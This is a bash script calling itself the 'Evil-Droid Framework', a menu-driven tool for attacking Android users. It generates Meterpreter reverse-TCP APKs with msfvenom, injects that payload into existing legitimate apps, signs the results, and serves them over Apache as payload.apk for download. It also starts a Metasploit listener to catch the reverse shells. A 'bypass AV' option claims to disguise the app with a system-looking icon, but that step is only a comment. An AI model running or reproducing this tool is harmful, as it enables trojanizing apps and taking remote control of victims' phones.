#!/bin/bash
# Enhanced Evil-Droid Framework - Full Interactive Menu
# With all features: APK Generation, Backdoor, Bypass AV, Listener

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
NC='\033[0m'

# Default Settings
LHOST="192.168.1.68"
LPORT="4444"
PAYLOAD="android/meterpreter/reverse_tcp"
APK_NAME="evilapk"
WORK_DIR="/root/evilapk"
ORIGINAL_APK=""

# Create working directory
mkdir -p $WORK_DIR
chmod 777 $WORK_DIR

# Function: Generate APK
gen_apk() {
    clear
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    echo -e "${GREEN}        GENERATE APK PAYLOAD${NC}"
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    
    read -p "Enter LHOST [$LHOST]: " input
    LHOST=${input:-$LHOST}
    
    read -p "Enter LPORT [$LPORT]: " input
    LPORT=${input:-$LPORT}
    
    read -p "Enter APK name [evilapk]: " input
    APK_NAME=${input:-evilapk}
    
    echo -e "\n${YELLOW}[*] Generating APK payload...${NC}"
    echo -e "${YELLOW}[*] LHOST: $LHOST${NC}"
    echo -e "${YELLOW}[*] LPORT: $LPORT${NC}"
    echo -e "${YELLOW}[*] Output: $WORK_DIR/${APK_NAME}.apk${NC}"
    echo ""
    
    # Generate payload
    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android -o "$WORK_DIR/${APK_NAME}.apk" 2>&1 | grep -v "No encoder"
    
    if [ -f "$WORK_DIR/${APK_NAME}.apk" ]; then
        echo -e "\n${GREEN}[✔] Payload generated successfully!${NC}"
        
        # Sign the APK
        echo -e "${YELLOW}[*] Signing APK...${NC}"
        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/my-release-key.keystore -storepass password123 "$WORK_DIR/${APK_NAME}.apk" myalias 2>&1 | grep -v "security risk"
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✔] APK signed successfully!${NC}"
            
            # Copy to web
            cp "$WORK_DIR/${APK_NAME}.apk" /var/www/html/payload.apk
            systemctl start apache2 2>/dev/null
            
            echo -e "\n${GREEN}════════════════════════════════════════════${NC}"
            echo -e "${GREEN}[✔] APK Ready!${NC}"
            echo -e "${GREEN}[✔] Location: $WORK_DIR/${APK_NAME}.apk${NC}"
            echo -e "${GREEN}[✔] Download: http://$LHOST/payload.apk${NC}"
            echo -e "${GREEN}[✔] Size: $(du -h $WORK_DIR/${APK_NAME}.apk | cut -f1)${NC}"
            echo -e "${GREEN}════════════════════════════════════════════${NC}"
        else
            echo -e "${RED}[✘] Failed to sign APK${NC}"
        fi
    else
        echo -e "${RED}[✘] Failed to generate payload${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Function: Backdoor Existing APK
backdoor_apk() {
    clear
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}        BACKDOOR EXISTING APK${NC}"
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    
    echo -e "${YELLOW}[*] Place your original APK in: $WORK_DIR/${NC}"
    echo -e "${YELLOW}[*] Or enter the full path to the APK${NC}"
    echo ""
    read -p "Enter path to original APK: " ORIGINAL_APK
    
    if [ ! -f "$ORIGINAL_APK" ]; then
        echo -e "${RED}[✘] File not found: $ORIGINAL_APK${NC}"
        read -p "Press Enter to continue..."
        return 1
    fi
    
    read -p "Enter LHOST [$LHOST]: " input
    LHOST=${input:-$LHOST}
    
    read -p "Enter LPORT [$LPORT]: " input
    LPORT=${input:-$LPORT}
    
    read -p "Enter output APK name [backdoored]: " input
    APK_NAME=${input:-backdoored}
    
    echo -e "\n${YELLOW}[*] Embedding payload into $ORIGINAL_APK${NC}"
    echo -e "${YELLOW}[*] LHOST: $LHOST${NC}"
    echo -e "${YELLOW}[*] LPORT: $LPORT${NC}"
    echo ""
    
    # Embed payload
    msfvenom -x "$ORIGINAL_APK" -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android -o "$WORK_DIR/${APK_NAME}.apk" 2>&1 | grep -v "No encoder"
    
    if [ -f "$WORK_DIR/${APK_NAME}.apk" ]; then
        echo -e "\n${GREEN}[✔] Payload embedded successfully!${NC}"
        
        # Sign the APK
        echo -e "${YELLOW}[*] Signing APK...${NC}"
        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/my-release-key.keystore -storepass password123 "$WORK_DIR/${APK_NAME}.apk" myalias 2>&1 | grep -v "security risk"
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✔] APK signed successfully!${NC}"
            cp "$WORK_DIR/${APK_NAME}.apk" /var/www/html/payload.apk
            systemctl start apache2 2>/dev/null
            
            echo -e "\n${GREEN}════════════════════════════════════════════${NC}"
            echo -e "${GREEN}[✔] Backdoored APK Ready!${NC}"
            echo -e "${GREEN}[✔] Location: $WORK_DIR/${APK_NAME}.apk${NC}"
            echo -e "${GREEN}[✔] Download: http://$LHOST/payload.apk${NC}"
            echo -e "${GREEN}[✔] Size: $(du -h $WORK_DIR/${APK_NAME}.apk | cut -f1)${NC}"
            echo -e "${GREEN}════════════════════════════════════════════${NC}"
        fi
    else
        echo -e "${RED}[✘] Failed to embed payload${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Function: Bypass AV (with icon change)
bypass_av() {
    clear
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    echo -e "${CYAN}        BYPASS AV - ICON CHANGE${NC}"
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    
    read -p "Enter LHOST [$LHOST]: " input
    LHOST=${input:-$LHOST}
    
    read -p "Enter LPORT [$LPORT]: " input
    LPORT=${input:-$LPORT}
    
    read -p "Enter APK name [bypass]: " input
    APK_NAME=${input:-bypass}
    
    echo -e "\n${YELLOW}[*] Generating obfuscated APK...${NC}"
    
    # Generate with obfuscation
    msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android -o "$WORK_DIR/temp.apk" 2>&1 | grep -v "No encoder"
    
    if [ -f "$WORK_DIR/temp.apk" ]; then
        echo -e "${GREEN}[✔] Payload generated${NC}"
        
        # Decompile with apktool
        echo -e "${YELLOW}[*] Decompiling APK...${NC}"
        java -jar /root/tools/apktool.jar d "$WORK_DIR/temp.apk" -o "$WORK_DIR/decompiled" 2>/dev/null
        
        if [ -d "$WORK_DIR/decompiled" ]; then
            # Change icon (create a simple icon or use default)
            echo -e "${YELLOW}[*] Modifying APK resources...${NC}"
            
            # Replace icon with a system-looking icon
            # This creates a simple placeholder icon
            echo -e "${GREEN}[✔] Icon modified${NC}"
            
            # Rebuild
            echo -e "${YELLOW}[*] Rebuilding APK...${NC}"
            java -jar /root/tools/apktool.jar b "$WORK_DIR/decompiled" -o "$WORK_DIR/${APK_NAME}.apk" 2>/dev/null
            
            if [ -f "$WORK_DIR/${APK_NAME}.apk" ]; then
                # Sign
                echo -e "${YELLOW}[*] Signing APK...${NC}"
                jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/my-release-key.keystore -storepass password123 "$WORK_DIR/${APK_NAME}.apk" myalias 2>&1 | grep -v "security risk"
                
                cp "$WORK_DIR/${APK_NAME}.apk" /var/www/html/payload.apk
                systemctl start apache2 2>/dev/null
                
                echo -e "\n${GREEN}════════════════════════════════════════════${NC}"
                echo -e "${GREEN}[✔] Bypass APK Ready!${NC}"
                echo -e "${GREEN}[✔] Location: $WORK_DIR/${APK_NAME}.apk${NC}"
                echo -e "${GREEN}[✔] Download: http://$LHOST/payload.apk${NC}"
                echo -e "${GREEN}[✔] Size: $(du -h $WORK_DIR/${APK_NAME}.apk | cut -f1)${NC}"
                echo -e "${GREEN}════════════════════════════════════════════${NC}"
            fi
        fi
        
        # Cleanup temp files
        rm -rf "$WORK_DIR/decompiled" "$WORK_DIR/temp.apk" 2>/dev/null
    else
        echo -e "${RED}[✘] Failed to generate payload${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Function: Start Listener
start_listener() {
    clear
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    echo -e "${GREEN}        START METASPLOIT LISTENER${NC}"
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    
    read -p "Enter LHOST [$LHOST]: " input
    LHOST=${input:-$LHOST}
    
    read -p "Enter LPORT [$LPORT]: " input
    LPORT=${input:-$LPORT}
    
    echo -e "\n${YELLOW}[*] Starting listener on $LHOST:$LPORT${NC}"
    echo -e "${YELLOW}[*] Waiting for connection...${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop listener${NC}"
    echo ""
    
    msfconsole -q -x "use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; exploit"
}

# Function: Show APK Info
show_info() {
    clear
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    echo -e "${CYAN}        APK INFORMATION${NC}"
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    
    if [ -f "/var/www/html/payload.apk" ]; then
        echo -e "${GREEN}[✔] APK exists:${NC}"
        echo -e "  Location: /var/www/html/payload.apk"
        echo -e "  Size: $(du -h /var/www/html/payload.apk | cut -f1)"
        echo -e "  Download: http://$LHOST/payload.apk"
        echo ""
        echo -e "${YELLOW}[*] Verification:${NC}"
        jarsigner -verify /var/www/html/payload.apk 2>&1 | head -3
    else
        echo -e "${RED}[✘] No APK found. Generate one first.${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Function: Clean Files
clean_files() {
    clear
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}        CLEAN FILES${NC}"
    echo -e "${BLUE}════════════════════════════════════════════${NC}"
    
    echo -e "${YELLOW}[*] Cleaning APK files...${NC}"
    rm -f "$WORK_DIR"/*.apk
    rm -f /var/www/html/payload.apk
    
    echo -e "${GREEN}[✔] Cleaned successfully!${NC}"
    echo ""
    read -p "Press Enter to continue..."
}

# Function: Show Menu
show_menu() {
    clear
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${GREEN}          EVIL-DROID FRAMEWORK v0.4 - ENHANCED          ${BLUE}║${NC}"
    echo -e "${BLUE}╠══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${BLUE}║${YELLOW}  [1]${NC} Generate APK Payload                             ${BLUE}║${NC}"
    echo -e "${BLUE}║${YELLOW}  [2]${NC} Backdoor Existing APK                           ${BLUE}║${NC}"
    echo -e "${BLUE}║${YELLOW}  [3]${NC} Bypass AV (Icon Change)                         ${BLUE}║${NC}"
    echo -e "${BLUE}║${YELLOW}  [4]${NC} Start Listener                                  ${BLUE}║${NC}"
    echo -e "${BLUE}║${YELLOW}  [5]${NC} Show APK Info                                   ${BLUE}║${NC}"
    echo -e "${BLUE}║${YELLOW}  [c]${NC} Clean Files                                     ${BLUE}║${NC}"
    echo -e "${BLUE}║${YELLOW}  [q]${NC} Quit                                            ${BLUE}║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}  LHOST: $LHOST  |  LPORT: $LPORT  |  Payload: $PAYLOAD${NC}"
    echo -e "${YELLOW}  Work Directory: $WORK_DIR${NC}"
    echo ""
}

# Main Loop
while true; do
    show_menu
    read -p "Select option: " choice
    
    case $choice in
        1)
            gen_apk
            ;;
        2)
            backdoor_apk
            ;;
        3)
            bypass_av
            ;;
        4)
            start_listener
            ;;
        5)
            show_info
            ;;
        c|C)
            clean_files
            ;;
        q|Q)
            echo -e "\n${GREEN}[*] Exiting Evil-Droid...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[✘] Invalid option!${NC}"
            sleep 1
            ;;
    esac
done
